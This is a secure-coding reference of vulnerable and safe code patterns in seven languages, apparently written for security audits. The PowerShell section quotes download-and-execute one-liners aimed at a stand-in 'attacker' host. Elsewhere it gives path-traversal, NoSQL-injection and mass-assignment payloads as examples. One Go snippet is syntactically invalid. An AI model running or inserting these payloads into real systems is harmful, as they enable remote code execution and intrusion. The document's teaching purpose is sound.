# Language-Specific Dangerous Patterns

> Last reviewed: 2026-04-03 | Next review: 2027-04-03 | Priority: Essential | Automation: Full (Semgrep, Bandit, Gosec)


Quick-reference for per-language vulnerabilities to flag during security audits.

---

## Node.js / JavaScript

### Command Injection (CWE-78)
```javascript
// ❌ Vulnerable
const { exec } = require('child_process');
exec(`ping ${userInput}`);                       // shell injection via exec
execSync(`ls ${userInput}`);                     // same
require('child_process').exec(cmd, callback);    // callback form also vulnerable

// ✅ Safe
const { execFile } = require('child_process');
execFile('ping', [validatedHost]);               // args as array, no shell
```

### Code Injection (CWE-94)
```javascript
// ❌ Vulnerable
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);                     // string form = eval
setInterval(userInput, 1000);
vm.runInThisContext(userInput);                  // NOT sandboxed

// ✅ Safe: never eval user input. Use JSON.parse for data, not code execution.
```

### Prototype Pollution (CWE-1321)
```javascript
// ❌ Vulnerable patterns
merge(target, userControlledObject);             // lodash < 4.17.21
obj[userKey] = userValue;                        // if userKey = '__proto__'
JSON.parse(input, reviver);                      // reviver can pollute

// ✅ Safe
const config = new Map();                        // Map is not pollutable
config.set(key, value);
// Or validate keys against an allowlist before assignment
```

### Path Traversal (CWE-22)
```javascript
// ❌ Vulnerable
const filePath = path.join(__dirname, userInput);   // __dirname + '../../etc/passwd'
fs.readFileSync('./uploads/' + userFilename);

// ✅ Safe
const safe = path.resolve('./uploads', userFilename);
if (!safe.startsWith(path.resolve('./uploads'))) throw new Error('Invalid path');
```

### NoSQL Injection (CWE-943)
```javascript
// ❌ Vulnerable (MongoDB)
db.users.findOne({ username: req.body.username });
// Attack: { "username": { "$gt": "" } } dumps all users

// ✅ Safe
const username = String(req.body.username).trim().slice(0, 50);
db.users.findOne({ username });   // primitive, not object
```

---

## Python

### Command Injection (CWE-78)
```python
# ❌ Vulnerable
import os, subprocess
os.system(f"ping {user_input}")
subprocess.run(user_input, shell=True)      # shell=True is the danger flag
subprocess.call(cmd, shell=True)

# ✅ Safe
subprocess.run(["ping", validated_host])    # list form, no shell
```

### Code Injection (CWE-94)
```python
# ❌ Vulnerable
eval(user_input)
exec(user_input)
compile(user_input, '<string>', 'exec')

# ✅ Safe: never eval user input.
# For expression evaluation, use ast.literal_eval() for literals only.
import ast
value = ast.literal_eval(user_input)   # safe only for literals (str, int, list…)
```

### Deserialization (CWE-502)
```python
# ❌ Vulnerable - RCE via crafted pickle
import pickle
data = pickle.loads(user_supplied_bytes)   # CRITICAL: arbitrary code execution

# Also dangerous
import yaml
yaml.load(user_input)                      # use yaml.safe_load() instead
import marshal
marshal.loads(user_bytes)                  # same as pickle

# ✅ Safe alternatives
import json
data = json.loads(user_input)              # JSON only, no code execution
yaml.safe_load(user_input)                 # YAML without arbitrary objects
```

### Path Traversal (CWE-22)
```python
# ❌ Vulnerable
open(f"/uploads/{user_filename}")
Path("/uploads") / user_filename

# ✅ Safe
from pathlib import Path
base = Path("/uploads").resolve()
target = (base / user_filename).resolve()
if not str(target).startswith(str(base)):
    raise ValueError("Path traversal detected")
```

### Template Injection / SSTI (CWE-94)
```python
# ❌ Vulnerable (Jinja2)
from jinja2 import Template
t = Template(user_input)           # user controls the template = code exec
t.render(user_input)               # same

# ✅ Safe
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))
template = env.get_template('fixed_template.html')  # template from file, not user input
template.render(data=safe_data)
```

---

## PHP

### Command Injection (CWE-78)
```php
// ❌ Vulnerable
system($_GET['cmd']);
exec($_POST['command'], $output);
shell_exec("ls " . $_GET['dir']);
passthru("cat " . $userFile);
`{$_GET['cmd']}`;                    // backtick operator

// ✅ Safe
$escaped = escapeshellarg($userInput);
exec("ping " . $escaped, $output, $return);
// Better: avoid shell calls entirely; use PHP native functions
```

### Code Injection (CWE-94)
```php
// ❌ Vulnerable
eval($_POST['code']);
assert($userInput);                  // in old PHP, assert() evaluates strings
preg_replace('/pattern/e', $code, $input);   // /e modifier = eval (PHP < 7)

// ✅ Safe: never eval user input. Remove /e modifier entirely.
```

### File Inclusion (CWE-98)
```php
// ❌ Vulnerable
include($_GET['page']);
require($_GET['template'] . '.php');
include_once("lang/" . $lang);      // if $lang = '../../../etc/passwd%00'

// ✅ Safe - strict allowlist
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed, true)) $page = 'home';
include("pages/{$page}.php");
```

### SQL Injection (CWE-89)
```php
// ❌ Vulnerable
$q = "SELECT * FROM users WHERE id = " . $_GET['id'];
mysqli_query($conn, $q);

// ✅ Safe (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

### Dangerous Variable Extraction
```php
// ❌ Vulnerable - extract() can overwrite any variable
extract($_POST);      // Attack: POST _SESSION[role]=admin

// ✅ Never use extract() with user data
```

---

## Go

### Template Injection (CWE-79 / CWE-94)
```go
// ❌ Vulnerable - text/template does NOT auto-escape HTML
import "text/template"
t := template.Must(template.New("").Parse(userTemplate))
t.Execute(w, data)   // XSS if userTemplate contains {{.SensitiveField}}

// ✅ Safe
import "html/template"
t := html/template.Must(html/template.New("").Parse(fixedTemplate))
// html/template auto-escapes context-appropriately
```

### Command Injection (CWE-78)
```go
// ❌ Vulnerable
import "os/exec"
cmd := exec.Command("sh", "-c", "ping " + userInput)  // shell injection

// ✅ Safe
cmd := exec.Command("ping", validatedHost)   // args as separate strings
```

### Path Traversal (CWE-22)
```go
// ❌ Vulnerable
http.ServeFile(w, r, "./static/" + r.URL.Path)

// ✅ Safe
filePath := filepath.Join("./static", filepath.Clean(r.URL.Path))
if !strings.HasPrefix(filePath, filepath.Clean("./static")) {
    http.Error(w, "Forbidden", 403)
    return
}
http.ServeFile(w, r, filePath)
```

### SQL Injection (CWE-89)
```go
// ❌ Vulnerable
db.Query("SELECT * FROM users WHERE id = " + userID)

// ✅ Safe
db.Query("SELECT * FROM users WHERE id = $1", userID)
```

---

## Ruby

### Command Injection (CWE-78)
```ruby
# ❌ Vulnerable
system("ping #{user_input}")
`ls #{user_input}`            # backtick = shell execution
exec("echo #{user_input}")
IO.popen("cat #{user_input}")

# ✅ Safe
system("ping", validated_host)    # array form avoids shell interpolation
```

### Code Injection (CWE-94)
```ruby
# ❌ Vulnerable
eval(user_input)
binding.eval(user_input)
ERB.new(user_input).result   # if user controls the template

# ✅ Safe: never eval user-controlled strings
```

### Deserialization (CWE-502)
```ruby
# ❌ Vulnerable
Marshal.load(user_supplied_data)   # RCE via crafted Marshal payload

# ✅ Safe
JSON.parse(user_input)             # JSON only
YAML.safe_load(user_input)         # safe_load, not load
```

### Mass Assignment
```ruby
# ❌ Vulnerable (Rails)
User.new(params[:user])            # attacker can set admin: true

# ✅ Safe - strong parameters
params.require(:user).permit(:name, :email)
```

---

## PowerShell

PowerShell scripts (`.ps1`, `.psm1`) are the most-shipped, least-reviewed code in many ops teams. AMSI, ScriptBlock logging and Constrained Language Mode help in defense-in-depth, but the patterns below are what gets you breached in the first place.

### Code / Expression Injection (CWE-94, CWE-95)
```powershell
# ❌ Vulnerable - "the eval of PowerShell"
Invoke-Expression $userInput                       # alias: iex
iex $userInput
& ([scriptblock]::Create($userInput))              # same risk via ScriptBlock
$sb = [scriptblock]::Create("Get-Process $name")  # if $name is user input → RCE

# ❌ The famous drive-by one-liner: do not write code that imitates this
iex (New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')
iex (irm https://attacker/p.ps1)

# ❌ Add-Type with user-controlled C# = arbitrary code execution
Add-Type -TypeDefinition $userSuppliedCSharp

# ✅ Safe: call cmdlets with parameters, never compose code from input
Get-Process -Name $validatedName
Invoke-Command -ScriptBlock { Get-Process -Name $args[0] } -ArgumentList $validatedName
```

### Command Injection (CWE-78)
```powershell
# ❌ Vulnerable - cmd.exe interpolation
cmd /c "ping $userInput"
& "cmd.exe" "/c" "ping $userInput"
Start-Process "cmd.exe" -ArgumentList "/c ping $userInput"
Invoke-Expression "ping $userInput"

# ❌ Even native binaries are unsafe with concatenated strings
& "C:\tools\tool.exe $userArgs"                    # parsed as one string

# ✅ Safe: pass arguments as separate elements (no shell parsing)
& ping.exe $validatedHost
Start-Process -FilePath "ping.exe" -ArgumentList $validatedHost -NoNewWindow -Wait
& "C:\tools\tool.exe" "--host" $validatedHost      # each arg quoted separately
```

### Path Traversal (CWE-22)
```powershell
# ❌ Vulnerable
Get-Content "C:\uploads\$userFile"
Remove-Item "C:\uploads\$userFile"
Test-Path "$base\$userFile"

# ✅ Safe: resolve and verify the path stays inside the base directory
$base   = (Resolve-Path 'C:\uploads').Path
$target = [System.IO.Path]::GetFullPath((Join-Path $base $userFile))
if (-not $target.StartsWith($base, [System.StringComparison]::OrdinalIgnoreCase)) {
    throw "Path traversal detected"
}
Get-Content $target
```

### Insecure Deserialization (CWE-502)
```powershell
# ❌ Vulnerable - Import-Clixml deserializes arbitrary .NET objects
$data = Import-Clixml -Path $attackerControlledFile

# ❌ ConvertFrom-Json into typed objects is fine, but never call -AsHashtable
#    blindly and then pipe it into New-Object / Invoke-Expression.

# ✅ Safe alternatives for untrusted input
$data = Get-Content $file -Raw | ConvertFrom-Json   # plain JSON, no code exec
```

### Hardcoded / Mishandled Secrets (CWE-798, CWE-321)
```powershell
# ❌ Vulnerable - "secure string" with -AsPlainText is NOT encryption
$cred = ConvertTo-SecureString "Hunter2!" -AsPlainText -Force
$pwd  = "P@ssw0rd"   # plain literal in a script committed to git

# ❌ ConvertFrom-SecureString without -Key uses DPAPI bound to the current
#    user/machine. That file is not portable; if the attacker is the same user,
#    they decrypt it for free.
$cred | ConvertFrom-SecureString | Out-File creds.txt

# ✅ Safe: use the SecretManagement module backed by a real vault
Install-Module Microsoft.PowerShell.SecretManagement, Microsoft.PowerShell.SecretStore
$pwd  = Get-Secret -Name 'svc-account-password' -AsPlainText
$cred = Get-Secret -Name 'svc-account-credential'   # PSCredential

# Or pull from a managed vault (Azure Key Vault, AWS Secrets Manager, HashiCorp Vault)
$secret = Get-AzKeyVaultSecret -VaultName 'kv-prod' -Name 'svc-pwd' -AsPlainText
```

### TLS / Certificate Bypass (CWE-295)
```powershell
# ❌ Vulnerable - disables ALL cert validation process-wide (legacy WinPS 5.x)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
Add-Type @"
    using System.Net; using System.Security.Cryptography.X509Certificates;
    public class TrustAll : ICertificatePolicy {
        public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
                                          WebRequest req, int problem) { return true; }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll

# ❌ PS 7+: per-call bypass is still wrong outside of a controlled lab
Invoke-WebRequest -Uri $url -SkipCertificateCheck
Invoke-RestMethod  -Uri $url -SkipCertificateCheck

# ✅ Safe: fix the cert chain, or pin the expected cert thumbprint
$resp = Invoke-WebRequest -Uri $url -CertificateThumbprint $expectedThumbprint
```

### Insecure Web Download (CWE-494, CWE-829)
```powershell
# ❌ Vulnerable - download then execute, no integrity check
Invoke-WebRequest $url -OutFile installer.exe
Start-Process .\installer.exe

# ❌ Worse - download and run in memory
iex (irm $url)

# ✅ Safe: pin the URL to HTTPS, verify a known SHA-256 before executing
$expected = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
Invoke-WebRequest $url -OutFile installer.exe -UseBasicParsing
$actual = (Get-FileHash installer.exe -Algorithm SHA256).Hash.ToLower()
if ($actual -ne $expected) { throw "Hash mismatch - aborting" }
Start-Process .\installer.exe
```

### "ExecutionPolicy Bypass" is not a security control
```powershell
# These are NOT vulnerabilities in your script - they are reminders that
# ExecutionPolicy is a user-preference, not a security boundary. Anyone can:
powershell -ExecutionPolicy Bypass -File evil.ps1
Get-Content evil.ps1 | powershell -NoProfile -Command -

# ✅ Real defenses for endpoints running PowerShell:
#   - Constrained Language Mode (via WDAC / AppLocker policy)
#   - Script signing enforced by WDAC, not by ExecutionPolicy
#   - AMSI on (do not disable it in your installer)
#   - Module + ScriptBlock + Transcription logging shipped to a SIEM
#   - JEA (Just Enough Administration) for remote management
```

### Auditing checklist for any `.ps1` you ship

- [ ] No `Invoke-Expression` / `iex` / `[scriptblock]::Create` on input you do not control.
- [ ] No `Add-Type -TypeDefinition` from input you do not control.
- [ ] No `cmd /c` / `Start-Process` with concatenated strings - always argument arrays.
- [ ] No `ConvertTo-SecureString -AsPlainText -Force` with a literal password.
- [ ] No `-SkipCertificateCheck` outside of explicit lab code paths.
- [ ] No download-then-run without a SHA-256 check against a pinned digest.
- [ ] Path inputs are resolved and bounded inside an allowed base directory.
- [ ] Script is signed (`Set-AuthenticodeSignature`) for distribution channels that need it.
- [ ] ScriptBlock logging, module logging and transcription are not disabled.
- [ ] No secrets in the script - use SecretManagement or a cloud vault.

### Detection (Semgrep / PSScriptAnalyzer)

```powershell
# PSScriptAnalyzer ships built-in security rules
Install-Module PSScriptAnalyzer -Scope CurrentUser
Invoke-ScriptAnalyzer -Path . -Recurse `
    -IncludeRule PSAvoidUsingInvokeExpression,
                 PSAvoidUsingPlainTextForPassword,
                 PSAvoidUsingConvertToSecureStringWithPlainText,
                 PSAvoidUsingUsernameAndPasswordParams,
                 PSUsePSCredentialType,
                 PSAvoidUsingWriteHost
```

Pair with InjectionHunter (`Install-Module InjectionHunter`) for additional injection-focused rules, and add `Invoke-ScriptAnalyzer` to the CI pipeline (it has a non-zero exit code on findings).

---

## Java

### SQL Injection (CWE-89)
```java
// ❌ Vulnerable
String q = "SELECT * FROM users WHERE id = " + userId;
stmt.executeQuery(q);

// ✅ Safe
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);
```

### XML / XXE (CWE-611)
```java
// ❌ Vulnerable
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Missing: disabling external entity processing

// ✅ Safe
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### Deserialization (CWE-502)
```java
// ❌ Vulnerable
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();    // RCE via gadget chains (Apache Commons, Spring…)

// ✅ Mitigations
// - Use JSON (Jackson, Gson) instead of Java serialization
// - Implement a serialization filter (ObjectInputFilter, Java 9+)
// - Use SerialKiller or NotSoSerial as a last resort
```
